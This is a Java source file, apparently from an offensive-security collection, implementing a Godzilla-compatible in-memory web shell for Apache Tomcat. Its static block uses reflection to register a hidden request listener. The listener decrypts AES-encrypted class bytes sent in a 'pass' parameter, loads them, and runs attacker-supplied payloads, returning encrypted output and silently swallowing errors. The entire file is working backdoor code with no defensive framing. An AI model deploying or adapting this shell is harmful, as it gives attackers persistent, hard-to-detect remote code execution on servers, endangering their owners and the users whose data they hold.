package com.demo.memshell.whole.shell.godzilla;

import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;

/**
 * @author Whoopsunix
 */
public class TomcatListenerContextClassGodzillaMS implements ServletRequestListener {
    public static String xc = "3c6e0b8a9c15224a"; // key
    public static String pass = "pass";
    public static String md5 = md5(pass + xc);

    public TomcatListenerContextClassGodzillaMS() {
    }


    public Class defClass(byte[] classBytes) throws Throwable {
        URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
        Method defMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
        defMethod.setAccessible(true);
        return (Class) defMethod.invoke(urlClassLoader, classBytes, 0, classBytes.length);
    }

    public byte[] x(byte[] s, boolean m) {
        try {
            javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
            c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), "AES"));
            return c.doFinal(s);
        } catch (Exception e) {
            return null;
        }
    }

    public static String md5(String s) {
        String ret = null;
        try {
            java.security.MessageDigest m;
            m = java.security.MessageDigest.getInstance("MD5");
            m.update(s.getBytes(), 0, s.length());
            ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();
        } catch (Exception e) {
        }
        return ret;
    }

    public static String base64Encode(byte[] bs) throws Exception {
        Class base64;
        String value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
            value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Encoder");
                Object Encoder = base64.newInstance();
                value = (String) Encoder.getClass().getMethod("encode", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
            } catch (Exception e2) {
            }
        }
        return value;
    }

    public static byte[] base64Decode(String bs) throws Exception {
        Class base64;
        byte[] value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
            value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
            } catch (Exception e2) {
            }
        }
        return value;
    }


    @Override
    public void requestDestroyed(ServletRequestEvent sre) {

    }

    @Override
    public void requestInitialized(ServletRequestEvent sre) {
        try {
            HttpServletRequest httpServletRequest = (HttpServletRequest) sre.getServletRequest();
            HttpSession session = httpServletRequest.getSession();
            org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) getFieldValue(httpServletRequest, "request");
            HttpServletResponse response = request.getResponse();


            byte[] data = base64Decode(httpServletRequest.getParameter(pass));
            data = x(data, false);
            if (session.getAttribute("payload") == null) {
                session.setAttribute("payload", defClass(data));
            } else {
                httpServletRequest.setAttribute("parameters", data);
                java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
                Object f = ((Class) session.getAttribute("payload")).newInstance();
                f.equals(arrOut);
                f.equals(request);
                response.getWriter().write(md5.substring(0, 16));
                f.toString();
                response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));
                response.getWriter().write(md5.substring(16));
            }
        } catch (Throwable e){

        }
    }


    static {
        try {
            // 获取 standardContext
            Object webappClassLoaderBase = Thread.currentThread().getContextClassLoader();
            Object standardContext;
            try {
                Method getResourcesmethod = webappClassLoaderBase.getClass().getDeclaredMethod("getResources");
                getResourcesmethod.setAccessible(true);
                Object resources = getResourcesmethod.invoke(webappClassLoaderBase);
                Method getContextmethod = resources.getClass().getDeclaredMethod("getContext");
                getContextmethod.setAccessible(true);
                standardContext = getContextmethod.invoke(resources);
            } catch (Exception ignored) {
                Object root = getFieldValue(webappClassLoaderBase, "resources");
                standardContext = getFieldValue(root, "context");
            }

            TomcatListenerContextClassGodzillaMS listenerMemShell = new TomcatListenerContextClassGodzillaMS();
//            standardContext.addApplicationEventListener(listenerMemShell);
            standardContext.getClass().getDeclaredMethod("addApplicationEventListener", Object.class).invoke(standardContext, listenerMemShell);

        } catch (Exception e) {
        }
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }
}
